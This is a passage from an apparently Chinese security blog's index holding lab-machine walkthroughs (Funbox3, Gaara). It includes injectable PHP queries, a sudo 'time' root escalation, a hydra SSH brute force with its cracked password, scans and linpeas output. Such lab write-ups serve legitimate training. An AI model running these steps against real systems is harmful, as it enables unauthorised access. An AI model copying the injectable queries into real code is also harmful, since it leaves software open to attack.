\u0026#39;$username\u0026#39;\u0026#34;; /var/www/html/gym/ex/profile/index.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/ex/profile/index.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = \u0026#39;$username\u0026#39;\u0026#34;; /var/www/html/gym/ex/register.php: \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Username\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\r/var/www/html/gym/ex/workouts/index.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/ex/workouts/index.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = \u0026#39;$username\u0026#39;\u0026#34;; /var/www/html/gym/include/functions.php: $_SESSION[\u0026#39;username\u0026#39;] = $username;\r/var/www/html/gym/include/functions.php: $username = preg_replace(\u0026#34;/[^a-zA-Z0-9_\\-]+/\u0026#34;, /var/www/html/gym/include/functions.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/include/register.inc.php: $p_stmt = \u0026#34;SELECT id FROM members WHERE username = ? LIMIT 1\u0026#34;;\r/var/www/html/gym/include/register.inc.php: $username = filter_input(INPUT_POST, \u0026#39;username\u0026#39;, FILTER_SANITIZE_STRING);\r/var/www/html/gym/index.php: \u0026lt;?php if (!isset($_SESSION[\u0026#39;username\u0026#39;])){echo\u0026#39;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;packages.php\u0026#34;\u0026gt;Package\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\r/var/www/html/gym/profile/action.php:$query1=mysqli_query($mysqli,\u0026#34;UPDATE `members` SET username =\u0026#39;$username\u0026#39;, email = \u0026#39;$email\u0026#39; where id = \u0026#39;$i\u0026#39;\u0026#34;);\r/var/www/html/gym/profile/action.php:$username = $_POST[\u0026#39;username\u0026#39;];\r/var/www/html/gym/profile/edit.php: \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; value=\u0026#34;\u0026lt;?php echo $q1[\u0026#39;username\u0026#39;];?\u0026gt;\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\r/var/www/html/gym/profile/fun.php: $query=\u0026#34;update members set url=\u0026#39;$url\u0026#39;, lastUpload=now() where username=\u0026#39;$user\u0026#39;\u0026#34;;\r/var/www/html/gym/profile/fun.php:$pull=\u0026#34;select * from members where username=\u0026#39;$user\u0026#39;\u0026#34;;\r/var/www/html/gym/profile/fun.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = \u0026#39;$username\u0026#39;\u0026#34;;\r/var/www/html/gym/profile/fun.php:$username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/profile/i.php: \u0026lt;label\u0026gt;Username\u0026lt;/label\u0026gt;: \u0026lt;?php echo $row[\u0026#34;username\u0026#34;];?\u0026gt;\u0026lt;br\u0026gt; /var/www/html/gym/profile/i.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/profile/i.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = \u0026#39;$username\u0026#39;\u0026#34;;\r/var/www/html/gym/profile/index.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/profile/index.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = \u0026#39;$username\u0026#39;\u0026#34;; /var/www/html/gym/register.php: \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Username\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\r/var/www/html/gym/workouts/index.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/workouts/index.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = \u0026#39;$username\u0026#39;\u0026#34;; /var/www/html/index.php: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;txtusername\u0026#34; class=\u0026#34;form-control\u0026#34;\u0026gt; /var/www/html/leftbar.php: \u0026lt;div class=\u0026#34;username\u0026#34; style=\u0026#34;font-size:12px;\u0026#34;\u0026gt;\u0026lt;?php echo $_SESSION[\u0026#39;name\u0026#39;];?\u0026gt;\u0026lt;/div\u0026gt;\r/var/www/html/store/controllers/DatabaseTalking/Talking.php: Talking::$userName = $user; /var/www/html/store/controllers/DatabaseTalking/Talking.php: private static $userName = \u0026#39;root\u0026#39;; /var/www/html/store/verify.php: if($email == $row[\u0026#39;username\u0026#39;] \u0026amp;\u0026amp; $pswd == $row[\u0026#39;password\u0026#39;]){\r[+] Searching specific hashes inside files - less false positives (limit 70) sudo -l\rUser tony may run the following commands on funbox3:\r(root) NOPASSWD: /usr/bin/yelp\r(root) NOPASSWD: /usr/bin/dmf\r(root) NOPASSWD: /usr/bin/whois\r(root) NOPASSWD: /usr/bin/rlogin\r(root) NOPASSWD: /usr/bin/pkexec\r(root) NOPASSWD: /usr/bin/mtr\r(root) NOPASSWD: /usr/bin/finger\r(root) NOPASSWD: /usr/bin/time\r(root) NOPASSWD: /usr/bin/cancel\r(root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh time命令提权\nsudo -u root time /bin/bash\rtony@funbox3:~$ sudo time whoami\rroot\r0.00user 0.00system 0:00.00elapsed ?%CPU (0avgtext+0avgdata 2180maxresident)k\r0inputs+0outputs (0major+98minor)pagefaults 0swaps\rtony@funbox3:~$ sudo time /bin/sh\r# whoami\rroot\r# /bin/bash\rroot@funbox3:/home/tony# cd /root\rroot@funbox3:~# ls\rproof.txt root.flag snap\rroot@funbox3:~# cat root.flag\rYour flag is in another file...\rroot@funbox3:~# ls\rproof.txt root.flag snap\rroot@funbox3:~# cat proof.txt\rf21e075a11d44f680bedce1f6f847087\rroot@funbox3:~# ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/funbox/","summary":"nmap -sS -sV -A -p- --min-rate 5000 192.168.183.111 ┌──(root㉿kali)-[~/桌面/vpn] └─# gobuster dir -u http://192.168.183.111/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -x php,txt,log,conf =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.183.111/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt","title":""},{"content":"nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.159.111 gobuster dir --url http://192.168.159.111/ -w /usr/share/wordlists//dirbuster/directory-list-lowercase-2.3-medium.txt -e -k -r -x php,cgi,txt,log,conf ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/funboxeasy/","summary":"nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.159.111 gobuster dir --url http://192.168.159.111/ -w /usr/share/wordlists//dirbuster/directory-list-lowercase-2.3-medium.txt -e -k -r -x php,cgi,txt,log,conf ","title":""},{"content":"┌──(root㉿kali)-[~/桌面/vpn]\r└─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.142\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 09:16 CST\rStats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 5.58% done; ETC: 09:16 (0:00:17 remaining)\rNmap scan report for 192.168.213.142\rHost is up (0.22s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 3ea36f6403331e76f8e498febee98e58 (RSA)\r| 256 6c0eb500e742444865effed77ce664d5 (ECDSA)\r|_ 256 b751f2f9855766a865542e05f940d2f4 (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-title: Gaara\r|_http-server-header: Apache/2.4.38 (Debian)\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.93%E=4%D=5/18%OT=22%CT=1%CU=42661%PV=Y%DS=4%DC=T%G=Y%TM=64657C9\rOS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M\rOS:551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%\rOS:O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%\rOS:DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=\rOS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)\rOS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=53\rOS:10%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 4 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 110/tcp)\rHOP RTT ADDRESS\r1 215.67 ms 192.168.45.1\r2 215.72 ms 192.168.45.254\r3 216.49 ms 192.168.251.1\r4 216.63 ms 192.168.213.142\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 44.51 seconds http://192.168.213.142/Cryoserver\r/Temari\r/Kazekage\r/iamGaara ┌──(root㉿kali)-[~/桌面/vpn]\r└─# hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 30 ssh://192.168.213.142\rHydra v9.4 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-18 09:42:15\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task\r[DATA] attacking ssh://192.168.213.142:22/\r[STATUS] 190.00 tries/min, 190 tries in 00:01h, 14344219 to do in 1258:16h, 20 active\r[22][ssh] host: 192.168.213.142 login: gaara password: iloveyou2\r1 of 1 target successfully completed, 1 valid password found\r[WARNING] Writing restore file because 10 final worker threads did not complete until end.\r[ERROR] 10 targets did not resolve or could not be connected\r[ERROR] 0 target did not complete\rHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-18 09:43:24 ssh登录，gaara:iloveyou2\ngaara@Gaara:~$ ./linpeas.sh\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄\r▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\rlinpeas v3.1.5 - Safe OSCP by carlospolop\rADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner\u0026#39;s permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE vector\rRED: You must take a look at it\rLightCyan: Users with console\rBlue: Users without console \u0026amp; mounted devs\rGreen: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangeta: Your username\rStarting linpeas. Caching Writable Folders...\r════════════════════════════════════╣ Basic information ╠════════════════════════════════════ OS: Linux version 4.19.0-13-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.160-2 (2020-11-28)\rUser \u0026amp; Groups: uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)\rHostname: Gaara\rWritable folder: /dev/shm\r[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /usr/bin/nc is available for network discover \u0026amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE ════════════════════════════════════╣ System Information ╠════════════════════════════════════ [+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 4.19.0-13-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.160-2 (2020-11-28)\rDistributor ID: Debian\rDescription: Debian GNU/Linux 10 (buster)\rRelease: 10\rCodename: buster\r[+] Sudo version\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.27 [+] USBCreator\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation [+] PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin\r[+] Date\rWed 17 May 2023 09:47:36 PM EDT [+] System stats\rFilesystem Size Used Avail Use% Mounted on udev 479M 0 479M 0% /dev\rtmpfs 99M 4.3M 95M 5% /run\r/dev/sda1 6.9G 1.8G 4.8G 27% /\rtmpfs 494M 0 494M 0% /dev/shm\rtmpfs 5.0M 0 5.0M 0% /run/lock\rtmpfs 494M 0 494M 0% /sys/fs/cgroup\rtmpfs 99M 0 99M 0% /run/user/1001\rtotal used free shared buff/cache available\rMem: 1009964 93356 686020 4648 230588 750360\rSwap: 998396 0 998396\r[+] CPU info\rArchitecture: x86_64 CPU op-mode(s): 32-bit, 64-bit\rByte Order: Little Endian\rAddress sizes: 45 bits physical, 48 bits virtual\rCPU(s): 1\rOn-line CPU(s) list: 0\rThread(s) per core: 1\rCore(s) per socket: 1\rSocket(s): 1\rNUMA node(s): 1\rVendor ID: AuthenticAMD\rCPU family: 23\rModel: 1\rModel name: AMD EPYC 7371 16-Core Processor\rStepping: 2\rCPU MHz: 3094.186\rBogoMIPS: 6188.37\rHypervisor vendor: VMware\rVirtualization type: full\rL1d cache: 32K\rL1i cache: 64K\rL2 cache: 512K\rL3 cache: 65536K\rNUMA node0 CPU(s): 0\rFlags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xgetbv1 xsaves clzero arat overflow_recov succor\r[+] Environment\r[i] Any private information inside environment variables? HISTFILESIZE=0 MAIL=/var/mail/gaara\rUSER=gaara\rSSH_CLIENT=192.168.45.156 58224 22\rXDG_SESSION_TYPE=tty\rSHLVL=1\rHOME=/home/gaara\rSSH_TTY=/dev/pts/0\rLOGNAME=gaara\r_=./linpeas.sh\rXDG_SESSION_CLASS=user\rTERM=xterm-256color\rXDG_SESSION_ID=5\rPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin\rXDG_RUNTIME_DIR=/run/user/1001\rLANG=en_US.UTF-8\rHISTSIZE=0\rSHELL=/bin/bash\rSSH_CONNECTION=192.168.45.156 58224 192.168.213.142 22\rHISTFILE=/dev/null\r[+] Searching Signature verification failed in dmseg\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed Not Found [+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.\rapparmor module is loaded.\r[+] grsecurity present? ............ grsecurity Not Found\r[+] PaX bins present? .............. PaX Not Found [+] Execshield enabled? ............ Execshield Not Found [+] SELinux enabled? ............... sestatus Not Found [+] Is ASLR enabled? ............... Yes [+] Printer? ....................... lpstat Not Found\r[+] Is this a virtual machine? ..... Yes (vmware) [+] Is this a container? ........... No\r[+] Any running containers? ........ No ═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════ [+] Any sd*/disk* disk in /dev? (limit 20) disk sda\rsda1\rsda2\rsda5\r[+] Unmounted file-system?\r[i] Check if you can mount umounted devices UUID=baaa0c0e-f29d-4fa3-ba73-9684dd24f96a / ext4 errors=remount-ro 0 1\rUUID=5cc3cf53-ffa2-4c94-99d8-1ce00f85aa97 none swap sw 0 0\r/dev/sr0 /media/cdrom0 udf,iso9660 user,noauto 0 0\r════════════════════════════════════╣ Available Software ╠════════════════════════════════════ [+] Useful software /usr/bin/nc /usr/bin/netcat\r/usr/bin/nc.traditional\r/usr/bin/wget\r/usr/bin/ping\r/usr/bin/gdb\r/usr/bin/base64\r/usr/bin/python\r/usr/bin/python2\r/usr/bin/python3\r/usr/bin/python2.7\r/usr/bin/python3.7\r/usr/bin/perl\r/usr/bin/sudo\r[+] Installed Compiler\r══════════════════════════════╣ Processes, Cron, Services, Timers \u0026amp; Sockets ╠════════════════════════════════ [+] Cleaned processes [i] Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes root 1 0.0 1.0 103948 10200 ? Ss 21:13 0:00 /sbin/init root 247 0.0 1.0 40380 10312 ? Ss 21:13 0:00 /lib/systemd/systemd-journald\rroot 268 0.0 0.5 22064 5120 ? Ss 21:13 0:00 /lib/systemd/systemd-udevd\rroot 1475 0.0 0.2 22064 2436 ? S 21:47 0:00 _ /lib/systemd/systemd-udevd\rsystemd+ 410 0.0 0.6 93084 6580 ? Ssl 21:13 0:00 /lib/systemd/systemd-timesyncd\r└─(Caps) 0x0000000002000000=cap_sys_time\rroot 412 0.0 1.0 48228 10692 ? Ss 21:13 0:00 /usr/bin/VGAuthService root 413 0.0 1.2 122880 12284 ? Ssl 21:13 0:01 /usr/bin/vmtoolsd\rroot 423 0.0 0.2 8504 2696 ? Ss 21:13 0:00 /usr/sbin/cron -f\rroot 424 0.0 0.4 225960 4548 ? Ssl 21:13 0:00 /usr/sbin/rsyslogd -n -iNONE\rmessage+ 425 0.0 0.4 8972 4336 ? Ss 21:13 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\r└─(Caps) 0x0000000020000000=cap_audit_write\rroot 427 0.0 0.5 19768 5228 ? Ss 21:13 0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant\rroot 428 0.0 0.7 19520 7308 ? Ss 21:13 0:00 /lib/systemd/systemd-logind\rroot 553 0.0 0.1 5612 1680 tty1 Ss+ 21:14 0:00 /sbin/agetty -o -p -- u --noclear tty1 linux\rroot 565 0.0 0.6 15852 6912 ? Ss 21:14 0:00 /usr/sbin/sshd -D\rgaara 1367 0.0 0.4 16928 4832 ? S 21:44 0:00 _ sshd: gaara@pts/0\rgaara 1368 0.0 0.4 7652 4496 pts/0 Ss 21:44 0:00 _ -bash\rgaara 1382 0.2 0.1 2728 2000 pts/0 S+ 21:47 0:00 _ /bin/sh ./linpeas.sh\rgaara 2027 0.0 0.0 2728 444 pts/0 S+ 21:47 0:00 _ /bin/sh ./linpeas.sh\rgaara 2031 0.0 0.3 10780 3092 pts/0 R+ 21:47 0:00 | _ ps fauxwww\rgaara 2030 0.0 0.0 2728 444 pts/0 S+ 21:47 0:00 _ /bin/sh ./linpeas.sh\rroot 660 0.0 0.4 8572 4868 ? Ss 21:15 0:00 /usr/sbin/apache2 -k start\rwww-data 1023 0.3 0.7 756036 7116 ? Sl 21:16 0:06 _ /usr/sbin/apache2 -k start www-data 1024 0.3 0.6 755892 6856 ? Sl 21:16 0:06 _ /usr/sbin/apache2 -k start gaara 1358 0.0 0.8 21024 8452 ? Ss 21:44 0:00 /lib/systemd/systemd --user\rgaara 1359 0.0 0.2 105196 2428 ? S 21:44 0:00 _ (sd-pam)\r[+] Binary processes permissions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes 0 lrwxrwxrwx 1 root root 4 Dec 13 2020 /bin/sh -\u0026gt; dash 1.5M -rwxr-xr-x 1 root root 1.5M Oct 24 2020 /lib/systemd/systemd\r144K -rwxr-xr-x 1 root root 143K Oct 24 2020 /lib/systemd/systemd-journald\r228K -rwxr-xr-x 1 root root 227K Oct 24 2020 /lib/systemd/systemd-logind\r56K -rwxr-xr-x 1 root root 55K Oct 24 2020 /lib/systemd/systemd-timesyncd\r664K -rwxr-xr-x 1 root root 663K Oct 24 2020 /lib/systemd/systemd-udevd\r64K -rwxr-xr-x 1 root root 64K Jan 10 2019 /sbin/agetty\r0 lrwxrwxrwx 1 root root 20 Oct 24 2020 /sbin/init -\u0026gt; /lib/systemd/systemd\r2.8M -rwxr-xr-x 1 root root 2.8M Mar 24 2020 /sbin/wpa_supplicant\r236K -rwxr-xr-x 1 root root 236K Jul 5 2020 /usr/bin/dbus-daemon[0m\r132K -rwxr-xr-x 1 root root 129K Oct 9 2019 /usr/bin/VGAuthService\r56K -rwxr-xr-x 1 root root 56K Oct 9 2019 /usr/bin/vmtoolsd\r672K -rwxr-xr-x 1 root root 672K Aug 25 2020 /usr/sbin/apache2\r56K -rwxr-xr-x 1 root root 55K Oct 11 2019 /usr/sbin/cron\r688K -rwxr-xr-x 1 root root 686K Feb 26 2019 /usr/sbin/rsyslogd\r792K -rwxr-xr-x 1 root root 789K Jan 31 2020 /usr/sbin/sshd\r[+] Files opened by processes belonging to other users\r[i] This is usually empty because of the lack of privileges to read other user processes information COMMAND PID TID TASKCMD USER FD TYPE DEVICE SIZE/OFF NODE NAME\r[+] Processes with credentials in memory (root req)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory gdm-password Not Found gnome-keyring-daemon Not Found lightdm Not Found vsftpd Not Found apache2 process found (dump creds from memory as root) sshd: process found (dump creds from memory as root)\r[+] Cron jobs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found\r-rw-r--r-- 1 root root 1042 Oct 11 2019 /etc/crontab /etc/cron.d:\rtotal 16\rdrwxr-xr-x 2 root root 4096 Dec 13 2020 .\rdrwxr-xr-x 85 root root 4096 Apr 27 2021 ..\r-rw-r--r-- 1 root root 285 May 19 2019 anacron\r-rw-r--r-- 1 root root 102 Oct 11 2019 .placeholder\r/etc/cron.daily:\rtotal 44\rdrwxr-xr-x 2 root root 4096 Dec 13 2020 .\rdrwxr-xr-x 85 root root 4096 Apr 27 2021 ..\r-rwxr-xr-x 1 root root 311 May 19 2019 0anacron\r-rwxr-xr-x 1 root root 539 Aug 8 2020 apache2\r-rwxr-xr-x 1 root root 1478 May 12 2020 apt-compat\r-rwxr-xr-x 1 root root 355 Dec 29 2017 bsdmainutils\r-rwxr-xr-x 1 root root 1187 Apr 18 2019 dpkg\r-rwxr-xr-x 1 root root 377 Aug 28 2018 logrotate\r-rwxr-xr-x 1 root root 1123 Feb 10 2019 man-db\r-rwxr-xr-x 1 root root 249 Sep 27 2017 passwd\r-rw-r--r-- 1 root root 102 Oct 11 2019 .placeholder\r/etc/cron.hourly:\rtotal 12\rdrwxr-xr-x 2 root root 4096 Dec 13 2020 .\rdrwxr-xr-x 85 root root 4096 Apr 27 2021 ..\r-rw-r--r-- 1 root root 102 Oct 11 2019 .placeholder\r/etc/cron.monthly:\rtotal 16\rdrwxr-xr-x 2 root root 4096 Dec 13 2020 .\rdrwxr-xr-x 85 root root 4096 Apr 27 2021 ..\r-rwxr-xr-x 1 root root 313 May 19 2019 0anacron\r-rw-r--r-- 1 root root 102 Oct 11 2019 .placeholder\r/etc/cron.weekly:\rtotal 20\rdrwxr-xr-x 2 root root 4096 Dec 13 2020 .\rdrwxr-xr-x 85 root root 4096 Apr 27 2021 ..\r-rwxr-xr-x 1 root root 312 May 19 2019 0anacron\r-rwxr-xr-x 1 root root 813 Feb 10 2019 man-db\r-rw-r--r-- 1 root root 102 Oct 11 2019 .placeholder\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\rHOME=/root\rLOGNAME=root\r1 5 cron.daily run-parts --report /etc/cron.daily\r7 10 cron.weekly run-parts --report /etc/cron.weekly\r@monthly 15 cron.monthly run-parts --report /etc/cron.monthly\r[+] Services\r[i] Search for outdated versions [ - ] anacron [ - ] apache-htcacheclean\r[ + ] apache2\r[ + ] apparmor\r[ - ] bluetooth\r[ - ] console-setup.sh\r[ + ] cron\r[ + ] dbus\r[ - ] hwclock.sh\r[ - ] keyboard-setup.sh\r[ + ] kmod\r[ + ] networking\r[ + ] open-vm-tools\r[ + ] procps\r[ + ] rsyslog\r[ + ] ssh\r[ - ] sudo\r[ + ] udev\r[ - ] x11-common\r[+] Systemd PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin [+] Analyzing .service files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services You can\u0026#39;t write on systemd PATH [+] System timers\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES\rWed 2023-05-17 22:33:40 EDT 46min left Wed 2023-05-17 21:34:39 EDT 12min ago anacron.timer anacron.service Thu 2023-05-18 00:00:00 EDT 2h 12min left Wed 2023-05-17 21:15:57 EDT 31min ago logrotate.timer logrotate.service Thu 2023-05-18 00:00:00 EDT 2h 12min left Wed 2023-05-17 21:15:57 EDT 31min ago man-db.timer man-db.service Thu 2023-05-18 06:36:59 EDT 8h left Wed 2023-05-17 21:15:57 EDT 31min ago apt-daily-upgrade.timer apt-daily-upgrade.service Thu 2023-05-18 07:45:38 EDT 9h left Wed 2023-05-17 21:15:57 EDT 31min ago apt-daily.timer apt-daily.service Thu 2023-05-18 21:28:33 EDT 23h left Wed 2023-05-17 21:28:30 EDT 19min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service [+] Analyzing .timer files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers [+] Analyzing .socket files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] HTTP sockets\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] D-Bus config files\r[i] 